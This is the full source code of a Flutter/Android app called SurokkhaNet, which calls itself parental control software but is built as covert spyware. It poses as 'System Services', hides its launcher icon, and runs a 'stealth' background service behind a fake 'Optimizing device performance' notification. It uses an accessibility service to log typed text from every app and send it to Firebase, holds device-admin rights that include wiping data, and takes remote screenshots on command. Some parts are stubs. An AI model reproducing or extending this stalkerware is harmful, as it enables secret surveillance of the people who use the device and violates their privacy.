
# SurokkhaNet Child App - Complete Source Code

This file contains the complete source code and file structure for the SurokkhaNet Child-Side Application. You can use this file to create the project on your local machine by creating the corresponding files and folders.

---

## **Folder Structure**

```
surokkhanet_child/
├── android/
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/
│   │   │   │   └── com/
│   │   │   │       └── surokkhanet/
│   │   │   │           ├── AccessibilityService.kt
│   │   │   │           ├── BackgroundService.kt
│   │   │   │           ├── DeviceAdminReceiver.kt
│   │   │   │           ├── ScreenCapture.kt
│   │   │   │           ├── SecretReceiver.kt
│   │   │   │           └── NativeBridge.kt
│   │   │   ├── res/
│   │   │   │   ├── xml/
│   │   │   │   │   ├── accessibility_config.xml
│   │   │   │   │   └── device_admin.xml
│   │   │   │   └── values/
│   │   │   │       └── strings.xml
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   └── build.gradle
├── lib/
│   ├── main.dart
│   ├── setup/
│   │   ├── welcome_screen.dart
│   │   ├── permission_flow.dart
│   │   └── link_screen.dart
│   ├── services/
│   │   ├── firebase_service.dart
│   │   ├── location_service.dart
│   │   ├── command_handler.dart
│   │   └── social_monitor.dart
│   ├── utils/
│   │   ├── constants.dart
│   │   ├── native_channel.dart
│   │   └── helpers.dart
│   └── background/
│       └── task_runner.dart
├── pubspec.yaml
└── google-services.json
```

---
---

## **Android Native Code & Configuration**

### **1. `android/app/src/main/AndroidManifest.xml`**

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.surokkhanet.child">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>

    <application
        android:name="io.flutter.app.FlutterApplication"
        android:label="System Services"
        android:usesCleartextTraffic="true"
        android:icon="@mipmap/ic_launcher">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <!-- Device Admin Receiver -->
        <receiver
            android:name=".DeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
            </intent-filter>
        </receiver>

        <!-- Background Service -->
        <service
            android:name=".BackgroundService"
            android:foregroundServiceType="location|camera"
            android:stopWithTask="false"
            android:enabled="true"
            android:exported="true"/>

        <!-- Accessibility Service -->
        <service
            android:name=".AccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <!-- Secret Code Receiver -->
        <receiver android:name=".SecretReceiver">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE"/>
                <data android:scheme="android_secret_code" android:host="7788"/>
            </intent-filter>
        </receiver>

        <!-- Boot Receiver -->
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

### **2. `android/app/src/main/res/xml/device_admin.xml`**

```xml
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password/>
        <watch-login/>
        <reset-password/>
        <force-lock/>
        <wipe-data/>
    </uses-policies>
</device-admin>
```

### **3. `android/app/src/main/res/xml/accessibility_config.xml`**

```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:settingsActivity="com.surokkhanet.child.MainActivity"
/>
```

### **4. `android/app/src/main/kotlin/com/surokkhanet/DeviceAdminReceiver.kt`**

```kotlin
package com.surokkhanet.child

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent

class DeviceAdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        // Device admin activated
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "Disabling this may compromise device security"
    }
}
```

### **5. `android/app/src/main/kotlin/com/surokkhanet/BackgroundService.kt`**

```kotlin
package com.surokkhanet.child

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings

class BackgroundService : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) : Int {
        createNotificationChannel()
        startForeground(1, createNotification())
        
        // Start other services
        // Example: startLocationTracking()
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "surokkhanet_channel",
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system processes"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "surokkhanet_channel")
        } else {
            Notification.Builder(this)
        }
        
        return builder
            .setContentTitle("System Services")
            .setContentText("Optimizing device performance")
            .setSmallIcon(android.R.drawable.ic_lock_idle_alarm) // Using a generic system icon
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
```

### **6. `android/app/src/main/kotlin/com/surokkhanet/AccessibilityService.kt`**

```kotlin
package com.surokkhanet.child

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.FirebaseDatabase

class AccessibilityService : AccessibilityService() {

    private lateinit var database: FirebaseDatabase

    override fun onServiceConnected() {
        database = FirebaseDatabase.getInstance()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
        }
        this.serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleKeyLog(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleAppMonitoring(event)
                }
            }
        }
    }

    private fun handleKeyLog(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: ""
        if (text.isNotEmpty()) {
            saveToFirebase("keylogs", mapOf(
                "text" to text,
                "package" to event.packageName,
                "timestamp" to System.currentTimeMillis()
            ))
        }
    }

    private fun handleAppMonitoring(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        packageName?.let {
            // Detect social media apps
            if (it.contains("whatsapp") || it.contains("facebook") || 
               it.contains("instagram") || it.contains("snapchat")) {
                saveToFirebase("social_media", mapOf(
                    "app" to it,
                    "timestamp" to System.currentTimeMillis()
                ))
            }
            
            // App blocking logic
            if (isBlockedApp(it)) {
                performGlobalAction(GLOBAL_ACTION_BACK)
                Handler(Looper.getMainLooper()).postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }, 100)
            }
        }
    }

    private fun isBlockedApp(packageName: String): Boolean {
        // This should check against a list of blocked apps from Firebase
        return false
    }

    private fun saveToFirebase(path: String, data: Map<String, Any>) {
        try {
            // Replace with your actual device ID logic
            val deviceId = "unique_device_id" 
            database.getReference("devices/$deviceId/$path").push().setValue(data)
        } catch (e: Exception) {
            Log.e("FirebaseError", e.message ?: "Unknown error")
        }
    }

    override fun onInterrupt() {}
}
```

### **7. `android/app/src/main/kotlin/com/surokkhanet/NativeBridge.kt`**

```kotlin
package com.surokkhanet.child

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.content.ComponentName
import android.content.pm.PackageManager
import android.app.admin.DevicePolicyManager
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class NativeBridge(private val context: Context, private val activity: Activity) {

    private val channel = "com.surokkhanet/native"

    fun configure(flutterEngine: FlutterEngine) {
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channel).setMethodCallHandler { call, result ->
            when (call.method) {
                "activateDeviceAdmin" -> {
                    activateDeviceAdmin()
                    result.success(true)
                }
                "openAccessibilitySettings" -> {
                    openAccessibilitySettings()
                    result.success(true)
                }
                "hideAppIcon" -> {
                    hideAppIcon()
                    result.success(true)
                }
                "startStealthService" -> {
                    startBackgroundService()
                    result.success(true)
                }
                "captureScreen" -> {
                    // Implement screen capture logic here
                    result.success("/sdcard/screenshot.png") // Placeholder
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun activateDeviceAdmin() {
        val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for advanced security features.")
        }
        activity.startActivityForResult(intent, 100)
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(context, "com.surokkhanet.child.MainActivity")
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startBackgroundService() {
        val intent = Intent(context, BackgroundService::class.java)
        ContextCompat.startForegroundService(context, intent)
    }
}
```

---
---

## **Flutter (Dart) Code**

### **8. `lib/main.dart`**

```dart
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:surokkhanet_child/setup/welcome_screen.dart';
import 'package:surokkhanet_child/utils/stealth_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  try {
    await Firebase.initializeApp();
  } catch (e) {
    print("Firebase initialization error: $e");
  }
  
  if (await StealthHandler.isStealthActive()) {
    StealthHandler.runInBackground();
  } else {
    runApp(const MyApp());
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Device Security',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: const WelcomeScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}
```

### **9. `lib/utils/stealth_handler.dart`**

```dart
import 'package:shared_preferences/shared_preferences.dart';
import 'package:surokkhanet_child/utils/native_channel.dart';
import 'package:surokkhanet_child/services/command_handler.dart';
// Import other services as needed

class StealthHandler {
  static Future<bool> isStealthActive() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('stealth_active') ?? false;
  }

  static Future<void> activateStealthMode() async {
    // Hide app icon via native code
    await NativeChannel.hideAppIcon();
    
    // Start the persistent background service
    await NativeChannel.startStealthService();
    
    // Save the state to persistent storage
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('stealth_active', true);
  }

  static void runInBackground() {
    // This function is called when the app starts in stealth mode.
    // It should initialize all necessary background tasks.
    
    // Initialize Firebase listeners for remote commands
    CommandHandler.initialize();

    // Start other monitoring services
    // LocationService.start();
    // SocialMonitor.start();
  }
}
```

### **10. `lib/services/command_handler.dart`**

```dart
import 'package:firebase_database/firebase_database.dart';
import 'package:surokkhanet_child/services/firebase_service.dart';
import 'package:surokkhanet_child/utils/native_channel.dart';

class CommandHandler {
  static void initialize() {
    // This should be a unique identifier for the device
    final deviceId = "get_unique_device_id_here"; 
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands');
    
    ref.onChildAdded.listen((event) async {
      final commandData = event.snapshot.value as Map?;
      final commandKey = event.snapshot.key;

      if (commandKey != null && commandData != null && commandData['status'] == 'pending') {
        await _processCommand(commandKey, Map<String, dynamic>.from(commandData));
      }
    });
  }

  static Future<void> _processCommand(String commandId, Map<String, dynamic> command) async {
    final deviceId = "get_unique_device_id_here";
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId/commands/$commandId');
    
    try {
      await ref.update({'status': 'processing'});
      
      switch (command['type']) {
        case 'take_screenshot':
          final imagePath = await NativeChannel.captureScreen();
          if (imagePath != null) {
            final url = await FirebaseService.uploadFile(imagePath, 'screenshots/$commandId.png');
            await ref.update({
              'status': 'completed',
              'imageUrl': url,
              'timestamp': ServerValue.timestamp,
            });
          } else {
            await ref.update({'status': 'failed', 'error': 'Could not capture screen.'});
          }
          break;
          
        // Add other command cases here
      }
    } catch (e) {
      await ref.update({'status': 'error', 'message': e.toString()});
    }
  }
}
```

### **11. `pubspec.yaml`**

```yaml
name: surokkhanet_child
description: Advanced Parental Control Solution
publish_to: 'none' # Prevent accidental publishing

version: 1.0.0+1

environment:
  sdk: '>=2.19.0 <3.0.0'

dependencies:
  flutter:
    sdk: flutter
  firebase_core: ^2.15.1
  firebase_database: ^10.1.0
  firebase_storage: ^11.1.0
  permission_handler: ^10.4.0
  shared_preferences: ^2.2.0
  geolocator: ^10.0.0
  device_info_plus: ^9.0.0

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^2.0.0

flutter:
  uses-material-design: true
  assets:
    - assets/
```

    